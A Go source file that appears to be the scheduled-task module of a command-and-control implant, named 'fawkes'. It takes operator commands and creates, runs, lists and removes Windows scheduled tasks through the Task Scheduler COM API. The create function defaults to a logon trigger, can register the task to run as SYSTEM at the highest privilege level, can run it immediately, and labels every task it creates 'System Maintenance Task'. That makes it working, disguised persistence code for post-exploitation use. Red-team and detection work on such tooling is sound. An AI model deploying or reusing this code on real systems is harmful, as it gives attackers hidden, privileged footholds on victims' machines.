//go:build windows
// +build windows

package commands

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type SchtaskCommand struct{}

func (c *SchtaskCommand) Name() string {
	return "schtask"
}

func (c *SchtaskCommand) Description() string {
	return "Manage scheduled tasks via Task Scheduler COM API (create, query, delete, run, list, enable, disable, stop)"
}

type schtaskArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	Program string `json:"program"`
	Args    string `json:"args"`
	Trigger string `json:"trigger"`
	Time    string `json:"time"`
	User    string `json:"user"`
	RunNow  bool   `json:"run_now"`
	Filter  string `json:"filter"`
}

// TASK_TRIGGER_* constants moved to command_helpers.go

// Task Scheduler 2.0 COM constants (non-trigger)
const (
	// Task action types
	TASK_ACTION_EXEC = 0

	// Task creation flags
	TASK_CREATE_OR_UPDATE = 6

	// Task logon types
	TASK_LOGON_S4U                      = 2
	TASK_LOGON_INTERACTIVE_TOKEN        = 3
	TASK_LOGON_SERVICE_ACCOUNT          = 5
	TASK_LOGON_INTERACTIVE_TOKEN_OR_PWD = 6

	// Task run flags
	TASK_RUN_NO_FLAGS = 0
)

func (c *SchtaskCommand) Execute(task structs.Task) structs.CommandResult {
	var args schtaskArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (action, name)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "create":
		return schtaskCreate(args)
	case "query":
		return schtaskQuery(args)
	case "delete":
		return schtaskDelete(args)
	case "run":
		return schtaskRun(args)
	case "list":
		return schtaskList(args.Filter)
	case "enable":
		return schtaskSetEnabled(args, true)
	case "disable":
		return schtaskSetEnabled(args, false)
	case "stop":
		return schtaskStop(args)
	default:
		return errorf("Unknown action: %s. Use: create, query, delete, run, list, enable, disable, stop", args.Action)
	}
}

// taskSchedulerConnection holds ITaskService and ITaskFolder COM interfaces.
type taskSchedulerConnection struct {
	service *ole.IDispatch
	folder  *ole.IDispatch
}

// connectTaskScheduler initializes COM, creates ITaskService, connects, and gets root folder.
// Caller must call cleanup() when done.
func connectTaskScheduler() (*taskSchedulerConnection, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to create Schedule.Service: %v", err)
	}

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to query IDispatch: %v", err)
	}

	// Connect to local task scheduler (pass nil variants for optional params)
	_, err = oleutil.CallMethod(service, "Connect", nil, nil, nil, nil)
	if err != nil {
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("ITaskService.Connect failed: %v", err)
	}

	// Get root folder
	folderResult, err := oleutil.CallMethod(service, "GetFolder", `\`)
	if err != nil {
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("GetFolder failed: %v", err)
	}
	folder := folderResult.ToIDispatch()

	conn := &taskSchedulerConnection{
		service: service,
		folder:  folder,
	}

	cleanup := func() {
		folder.Release()
		service.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return conn, cleanup, nil
}

// triggerTypeFromString moved to command_helpers.go

// buildTaskXML generates Task Scheduler 2.0 XML for registration.
func buildTaskXML(args schtaskArgs) string {
	trigger := args.Trigger
	if trigger == "" {
		trigger = "ONLOGON"
	}

	triggerXML := buildTriggerXML(trigger, args.Time)

	actionXML := fmt.Sprintf(`      <Exec>
        <Command>%s</Command>`, escapeXML(args.Program))
	if args.Args != "" {
		actionXML += fmt.Sprintf("\n        <Arguments>%s</Arguments>", escapeXML(args.Args))
	}
	actionXML += "\n      </Exec>"

	principalXML := ""
	if args.User != "" {
		if strings.EqualFold(args.User, "SYSTEM") || strings.EqualFold(args.User, "NT AUTHORITY\\SYSTEM") {
			principalXML = `  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>`
		} else {
			principalXML = fmt.Sprintf(`  <Principals>
    <Principal id="Author">
      <UserId>%s</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>`, escapeXML(args.User))
		}
	}

	xml := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
%s
  </Triggers>
  %s
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
%s
  </Actions>
</Task>`, triggerXML, principalXML, actionXML)

	return xml
}

// buildTriggerXML, escapeXML moved to command_helpers.go

func schtaskCreate(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for task creation")
	}
	if args.Program == "" {
		return errorResult("Error: program is required for task creation")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	trigger := args.Trigger
	if trigger == "" {
		trigger = "ONLOGON"
	}

	// Build task XML and register via RegisterTask (XML-based, avoids COM object deadlocks)
	taskXML := buildTaskXML(args)

	// RegisterTask(path, xmlText, flags, userId, password, logonType)
	// TASK_CREATE_OR_UPDATE = 6, TASK_LOGON_S4U = 2
	logonType := TASK_LOGON_S4U
	var userParam interface{} = nil
	if args.User != "" {
		userParam = args.User
		if strings.EqualFold(args.User, "SYSTEM") || strings.EqualFold(args.User, "NT AUTHORITY\\SYSTEM") {
			logonType = TASK_LOGON_SERVICE_ACCOUNT
			userParam = "SYSTEM"
		} else {
			logonType = TASK_LOGON_INTERACTIVE_TOKEN_OR_PWD
		}
	}

	regResult, err := oleutil.CallMethod(conn.folder, "RegisterTask",
		args.Name, taskXML, TASK_CREATE_OR_UPDATE, userParam, nil, logonType, nil)
	if err != nil {
		return errorf("Error registering task '%s': %v", args.Name, err)
	}
	regResult.Clear()

	result := fmt.Sprintf("Created scheduled task:\n  Name:    %s\n  Program: %s\n  Trigger: %s", args.Name, args.Program, trigger)
	if args.User != "" {
		result += fmt.Sprintf("\n  User:    %s", args.User)
	}

	// Optionally run immediately
	if args.RunNow {
		taskResult, getErr := oleutil.CallMethod(conn.folder, "GetTask", args.Name)
		if getErr == nil {
			taskDisp := taskResult.ToIDispatch()
			runResult, runErr := oleutil.CallMethod(taskDisp, "Run", nil)
			if runErr != nil {
				result += fmt.Sprintf("\n\nWarning: Task created but immediate run failed: %v", runErr)
			} else {
				result += "\n\nTask executed immediately"
				runResult.Clear()
			}
			taskDisp.Release()
			taskResult.Clear()
		}
	}

	return structs.CommandResult{
		Output:    result,
		Status:    "success",
		Completed: true,
	}
}

func schtaskQuery(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for task query")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	taskResult, err := oleutil.CallMethod(conn.folder, "GetTask", args.Name)
	if err != nil {
		return errorf("Error querying task '%s': %v", args.Name, err)
	}
	defer taskResult.Clear()
	taskDisp := taskResult.ToIDispatch()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Task: %s\n", args.Name))

	// Get task state
	stateResult, _ := oleutil.GetProperty(taskDisp, "State")
	if stateResult != nil {
		state := stateResult.Value()
		sb.WriteString(fmt.Sprintf("State: %s\n", taskStateToString(state)))
		stateResult.Clear()
	}

	// Get enabled status
	enabledResult, _ := oleutil.GetProperty(taskDisp, "Enabled")
	if enabledResult != nil {
		sb.WriteString(fmt.Sprintf("Enabled: %v\n", enabledResult.Value()))
		enabledResult.Clear()
	}

	// Get last run time
	lastRunResult, _ := oleutil.GetProperty(taskDisp, "LastRunTime")
	if lastRunResult != nil {
		sb.WriteString(fmt.Sprintf("Last Run Time: %v\n", lastRunResult.Value()))
		lastRunResult.Clear()
	}

	// Get next run time
	nextRunResult, _ := oleutil.GetProperty(taskDisp, "NextRunTime")
	if nextRunResult != nil {
		sb.WriteString(fmt.Sprintf("Next Run Time: %v\n", nextRunResult.Value()))
		nextRunResult.Clear()
	}

	// Get last task result
	lastResultProp, _ := oleutil.GetProperty(taskDisp, "LastTaskResult")
	if lastResultProp != nil {
		sb.WriteString(fmt.Sprintf("Last Result: %v\n", lastResultProp.Value()))
		lastResultProp.Clear()
	}

	// Get task XML for detailed info (safer than navigating nested COM objects)
	xmlResult, err := oleutil.GetProperty(taskDisp, "Xml")
	if err == nil && xmlResult != nil {
		xmlStr := xmlResult.ToString()
		xmlResult.Clear()
		// Extract key info from XML
		if desc := extractXMLValue(xmlStr, "Description"); desc != "" {
			sb.WriteString(fmt.Sprintf("Description: %s\n", desc))
		}
		if author := extractXMLValue(xmlStr, "Author"); author != "" {
			sb.WriteString(fmt.Sprintf("Author: %s\n", author))
		}
		if cmd := extractXMLValue(xmlStr, "Command"); cmd != "" {
			sb.WriteString(fmt.Sprintf("Action Path: %s\n", cmd))
		}
		if cmdArgs := extractXMLValue(xmlStr, "Arguments"); cmdArgs != "" {
			sb.WriteString(fmt.Sprintf("Action Args: %s\n", cmdArgs))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func schtaskDelete(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for task deletion")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	_, err = oleutil.CallMethod(conn.folder, "DeleteTask", args.Name, 0)
	if err != nil {
		return errorf("Error deleting task '%s': %v", args.Name, err)
	}

	return successf("Deleted scheduled task '%s'", args.Name)
}

func schtaskRun(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to run a task")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	taskResult, err := oleutil.CallMethod(conn.folder, "GetTask", args.Name)
	if err != nil {
		return errorf("Error finding task '%s': %v", args.Name, err)
	}
	defer taskResult.Clear()
	taskDisp := taskResult.ToIDispatch()

	runResult, err := oleutil.CallMethod(taskDisp, "Run", nil)
	if err != nil {
		return errorf("Error running task '%s': %v", args.Name, err)
	}
	runResult.Clear()

	return successf("Triggered execution of '%s'", args.Name)
}

// schtaskListEntry represents a scheduled task for JSON output
type schtaskListEntry struct {
	Name        string `json:"name"`
	State       string `json:"state"`
	NextRunTime string `json:"next_run_time,omitempty"`
}

func schtaskList(filter string) structs.CommandResult {
	// Use schtasks.exe /query /fo CSV — reliable across all Windows versions.
	// COM-based iteration (ForEach, Count+Item) hangs in Go's COM apartment model.
	out, err := execCmdTimeout("schtasks.exe", "/query", "/fo", "CSV", "/nh")
	if err != nil {
		return errorf("Error running schtasks.exe: %v\n%s", err, string(out))
	}

	filterLower := strings.ToLower(filter)
	var entries []schtaskListEntry
	reader := csv.NewReader(strings.NewReader(string(out)))
	for {
		record, err := reader.Read()
		if err != nil {
			break
		}
		if len(record) < 3 {
			continue
		}
		// CSV fields: TaskName, Next Run Time, Status
		name := strings.TrimSpace(record[0])
		if name == "" || name == "TaskName" || name == "INFO:" {
			continue
		}
		// Apply filter on task name
		if filterLower != "" && !strings.Contains(strings.ToLower(name), filterLower) {
			continue
		}
		nextRun := strings.TrimSpace(record[1])
		status := strings.TrimSpace(record[2])

		entries = append(entries, schtaskListEntry{
			Name:        name,
			State:       status,
			NextRunTime: nextRun,
		})
	}

	if len(entries) == 0 {
		return successResult("[]")
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return structs.CommandResult{
		Output:    string(data),
		Status:    "success",
		Completed: true,
	}
}

// schtaskSetEnabled enables or disables a scheduled task via IRegisteredTask.put_Enabled.
func schtaskSetEnabled(args schtaskArgs, enabled bool) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	taskResult, err := oleutil.CallMethod(conn.folder, "GetTask", args.Name)
	if err != nil {
		return errorf("Error finding task '%s': %v", args.Name, err)
	}
	defer taskResult.Clear()
	taskDisp := taskResult.ToIDispatch()

	_, err = oleutil.PutProperty(taskDisp, "Enabled", enabled)
	if err != nil {
		return errorf("Error setting enabled state for '%s': %v", args.Name, err)
	}

	action := "Enabled"
	if !enabled {
		action = "Disabled"
	}
	return successf("%s scheduled task '%s'", action, args.Name)
}

// schtaskStop stops a currently-running scheduled task instance.
func schtaskStop(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to stop a task")
	}

	conn, cleanup, err := connectTaskScheduler()
	if err != nil {
		return errorf("Error connecting to Task Scheduler: %v", err)
	}
	defer cleanup()

	taskResult, err := oleutil.CallMethod(conn.folder, "GetTask", args.Name)
	if err != nil {
		return errorf("Error finding task '%s': %v", args.Name, err)
	}
	defer taskResult.Clear()
	taskDisp := taskResult.ToIDispatch()

	_, err = oleutil.CallMethod(taskDisp, "Stop", 0)
	if err != nil {
		return errorf("Error stopping task '%s': %v", args.Name, err)
	}

	return successf("Stopped running instance of '%s'", args.Name)
}

// extractXMLValue extracts the text content of a simple XML element.
func extractXMLValue(xml, tag string) string {
	openTag := "<" + tag + ">"
	closeTag := "</" + tag + ">"
	start := strings.Index(xml, openTag)
	if start == -1 {
		return ""
	}
	start += len(openTag)
	end := strings.Index(xml[start:], closeTag)
	if end == -1 {
		return ""
	}
	return strings.TrimSpace(xml[start : start+end])
}

// taskStateToString converts a task state value to a readable string.
func taskStateToString(state interface{}) string {
	// IRegisteredTask.State values
	switch v := state.(type) {
	case int32:
		return taskStateIntToString(int(v))
	case int64:
		return taskStateIntToString(int(v))
	case int:
		return taskStateIntToString(v)
	default:
		return fmt.Sprintf("%v", state)
	}
}

func taskStateIntToString(state int) string {
	switch state {
	case 0:
		return "Unknown"
	case 1:
		return "Disabled"
	case 2:
		return "Queued"
	case 3:
		return "Ready"
	case 4:
		return "Running"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}
